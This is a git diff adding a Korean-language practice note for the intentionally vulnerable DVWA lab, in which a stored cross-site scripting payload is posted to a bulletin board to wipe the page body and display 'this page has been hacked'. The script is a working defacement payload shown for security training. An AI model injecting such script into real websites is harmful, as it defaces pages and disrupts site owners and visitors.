@@ -30,4 +30,25 @@ docker stop dvwa
 
 <img width="1917" height="943" alt="image" src="https://github.com/user-attachments/assets/204c9320-f501-41ee-ab1b-eeaf48642727" />
 
-## 
+## 본격 트레이닝
+
+### CASE 1.
+
+#### 게시판 목록 화면에서 스크립트 삽입을 통해 HTML 조작하여 게시판 마비
+
+##### 삽입 스크립트
+
+```
+<script>
+  document.getElementById('main_body').innerHTML = '';
+  var h1Tag = document.createElement('h1');
+  h1Tag.innerText = '이 페이지는 해킹 당했습니다.';
+  document.getElementById('main_body').append(h1Tag);
+</script>
+```
+
+<img width="892" height="859" alt="image" src="https://github.com/user-attachments/assets/76036b7d-69d7-4be8-ab17-f971eb6bf7ec" />
+
+##### 등록
+
+<img width="894" height="860" alt="image" src="https://github.com/user-attachments/assets/3602f5c8-42cc-481a-b1a7-7bfaf288a159" />
